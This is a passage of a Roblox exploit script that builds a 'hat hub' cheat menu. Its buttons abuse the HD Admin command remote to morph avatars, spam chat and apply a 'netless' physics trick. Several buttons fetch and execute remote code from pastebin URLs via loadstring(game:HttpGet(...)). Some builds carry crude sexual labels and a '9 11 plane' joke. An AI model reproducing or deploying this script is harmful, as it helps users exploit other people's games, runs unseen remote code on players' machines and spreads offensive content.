local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.74)
    local A_1 = ";hat me 7286662870"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.77)
    local A_1 = ";hat me 5231223671"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.80)
    local A_1 = ";hat me 6470135113"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.85)
    local A_1 = ";hat me 5231223671"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.88)
    local A_1 = ";hat me 6470135113"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.92)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section4:NewButton("Creeper", "wait some seconds", function()
    local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
    local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.55)
    local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.60)
    local A_1 = ";pants me 6529584315"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
    local A_1 = ";shirt me 5339301922"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.75)
    local A_1 = ";hat me 114385449"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.79)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section4:NewButton("Steve Minecraft", "wait some seconds", function()
    local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
    local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.55)
    local A_1 = ";face me 110288809"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.60)
    local A_1 = ";pants me 6601097989"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.65)
    local A_1 = ";shirt me 6601096093"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
    local A_1 = ";hat me 1081239"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.75)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
local Section5 = HatHubTap:NewSection("hat hup script")

Section5:NewButton("hat hup script", "wait 1 sec to load...", function()
    local args = {
    [1] = "Made By oudgsds,theshadow24124",
    [2] = "All"
}
loadstring(game:HttpGet("https://pastebin.com/raw/1Cjz1RMH"))()
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)

local Section6 = HatHubTap:NewSection("hat hup hats code *if dosen't work open made dis")

Section6:NewButton("Hand* it takes time!", "wait 16 seconds + need hathub", function()
    local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.40)
    local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.45)
    local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.51)
    local A_1 = ";hat me 4855525473"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.110)
    local A_1 = ";hat me 8337370"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.140)
    local A_1 = ";hat me 48474313"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.170)
    local A_1 = ";hat me 48474294"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.200)
    local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.230)
    local A_1 = ";hat me 62724852"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.260)
    local A_1 = ";hat me 20372960"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.290)
    local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.320)
    local A_1 = ";hat me 62234425"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.350)
    local A_1 = ";hat me 376524487"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.380)
    local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.400)
    local A_1 = ";hat me 62724852"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.430)
    local A_1 = ";hat me 20372960"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.470)
    local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.500)
    local A_1 = ";hat me 62234425"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.360)
     local A_1 = ";hat me 376524487"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.390)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("ssx Doll", "62234425,451220849", function()
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.54)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
     local A_1 = ";hat me 4904137145"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.62)
     local A_1 = ";hat me 4246228452"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.67)
     local A_1 = ";hat me 4911305457"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.72)
     local A_1 = ";hat me 4822592866"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.76)
     local A_1 = ";hat me 3992084515"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.82)
     local A_1 = ";hat me 14815761"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.87)
     local A_1 = ";hat me 48474294"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.93)
     local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.97)
     local A_1 = ";hat me 62234425"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.102)
     local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.106)
     local A_1 = ";hat me 3992084515"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.112)
     local A_1 = ";hat me 14815761"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.117)
     local A_1 = ";hat me 48474294"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.124)
     local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.130)
     local A_1 = ";hat me 62234425"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.135)
     local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.140)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("Plane", "191101707,4332375148,4708069539", function()
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.54)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
     local A_1 = ";hat me 4025460572"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.65)
     local A_1 = ";hat me 1532389"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
     local A_1 = ";hat me 191101707"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.75)
     local A_1 = ";hat me 4332375148"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.80)
     local A_1 = ";hat me 4708069539"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.85)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("Car", "wait 5 sec + open hathup", function()
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.54)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
     local A_1 = ";hat me 4435389917"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.65)
     local A_1 = ";hat me 191101707"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("PP", ",3992084515,63690008", function()
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.54)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
     local A_1 = ";hat me 17614451"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.65)
     local A_1 = ";hat me 4246228452"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
     local A_1 = ";hat me 3992084515"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.75)
     local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.80)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("9 11 plane", "you have to wait 25 seconds for wings", function()
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.54)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
     local A_1 = ";hat me 4690305028"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.65)
     local A_1 = ";hat me 4627469896"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
     local A_1 = ";hat me 4623675984"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.75)
     local A_1 = ";hat me 4602619613"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.80)
     local A_1 = ";hat me 4315489767"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.85)
     local A_1 = ";hat me 4794315940"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.90)
     local A_1 = ";hat me 4461505493"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.95)
     local A_1 = ";hat me 4461584953"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.100)
     local A_1 = ";hat me 4315489767"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.105)
     local A_1 = ";hat me 4315489767"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.110)
     local A_1 = ";hat me 4794315940"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.115)
     local A_1 = ";hat me 4461505493"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.120)
     local A_1 = ";hat me 4461584953"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.130)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("9 11", "you have to wait 25 seconds", function()
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.54)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
     local A_1 = ";hat me 62724852"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(1)
     local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(3)
     local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(6)
     local A_1 = ";hat me 62234425"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(9)
     local A_1 = ";hat me 20372960"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(12)
     local A_1 = ";hat me 28171753"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(15)
     local A_1 = ";hat me 4998547654"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(18)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("Bike", "wait 4 seconds", function()
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.54)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
     local A_1 = ";hat me 191101707"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.65)
     local A_1 = ";hat me 5063566353"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("Shidashian", "you have to wait 15 seconds", function()
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.54)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
     local A_1 = ";hat me 3806215779"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.65)
     local A_1 = ";hat me 5132802731"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
     local A_1 = ";hat me 31151864"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.75)
     local A_1 = ";hat me 27345567"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.80)
     local A_1 = ";hat me 24826811"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.85)
     local A_1 = ";hat me 24826755"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.90)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("Hoverboard", "you have to wait 5 seconds", function()
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.54)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
     local A_1 = ";hat me 28171753"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.65)
     local A_1 = ";hat me 191101707"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
     local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.75)
     local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.80)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("Tra$hCan", "you have to wait 5 seconds", function()
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.54)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
     local A_1 = ";hat me 4735336570"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.65)
     local A_1 = ";hat me 4735272012"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("Fairy", "you have to wait 3 seconds", function()
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.50)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.54)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
     local A_1 = ";hat me 150381051"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.60)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section6:NewButton("coming soon...", "coming soon natuto", function()
        local args = {
    [1] = "coming soon",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section6:NewButton("coming soon...", "coming soon strong stand", function()
        local args = {
    [1] = "coming soon",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)

local Section7 = ssxTap:NewSection("ssx fixing coming soon")

Section7:NewButton("r6", "needs admin!", function()
        local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
        local A_1 = ";char me "
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section7:NewButton("refresh", "needs admin!", function()
        local A_1 = ";refresh"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section7:NewButton("ran? netless", "netless wait 5 need r6", function()
   for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
    if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
    game:GetService("RunService").Heartbeat:connect(function()
    v.Velocity = Vector3.new(-30,0,0)
    end)
    end
    end
 
    game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "Notification";
        Text = "Netless Ran";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section7:NewButton("Baggut", "netless wait 5 need r6", function()
    local a=Instance.new("ScreenGui")local b=Instance.new("Frame")local c=Instance.new("TextLabel")local d=Instance.new("TextLabel")local e=Instance.new("TextButton")local f=Instance.new("TextButton")a.Parent=game.Players.LocalPlayer:WaitForChild("PlayerGui")a.ResetOnSpawn=false;b.Parent=a;b.BackgroundColor3=Color3.fromRGB(84,84,84)b.Position=UDim2.new(0.0540156364,0,0.424724609,0)b.Size=UDim2.new(0,147,0,148)b.Active=true;b.Draggable=true;c.Parent=b;c.BackgroundColor3=Color3.fromRGB(255,85,0)c.Position=UDim2.new(0,0,0.873928785,0)c.Size=UDim2.new(0,147,0,18)c.Font=Enum.Font.SourceSans;c.Text="theshadow24124"c.TextColor3=Color3.fromRGB(0,0,0)c.TextSize=17.000;d.Parent=b;d.BackgroundColor3=Color3.fromRGB(255,85,0)d.Size=UDim2.new(0,147,0,24)d.Font=Enum.Font.SourceSans;d.Text="PP خبزه"d.TextColor3=Color3.fromRGB(0,0,0)d.TextScaled=true;d.TextSize=14.000;d.TextWrapped=true;e.Parent=b;e.BackgroundColor3=Color3.fromRGB(255,85,0)e.Position=UDim2.new(0.0816326514,0,0.270270258,0)e.Size=UDim2.new(0,123,0,27)e.Font=Enum.Font.SourceSans;e.Text="PP"e.TextColor3=Color3.fromRGB(0,0,0)e.TextScaled=true;e.TextSize=20.000;e.TextWrapped=true;e.MouseButton1Down:connect(function()local g={[1]=";morph me DonaldTrump "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(g))local g={[1]=";morph me noob1 "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(g))local g={[1]=";char me 4034224714 "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(g))wait(1)local g={[1]=";hat me 4794106130 "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(g))wait(.1)loadstring(game:HttpGet('https://pastebin.com/raw/jR00xfMW'))()wait(.1)loadstring(game:HttpGet('https://pastebin.com/raw/4LcD1a5U'))()wait(.1)loadstring(game:HttpGet('https://pastebin.com/raw/u2AjuwWn'))()local h=game:GetService("Players").LocalPlayer;h.Character.Humanoid:UnequipTools()local 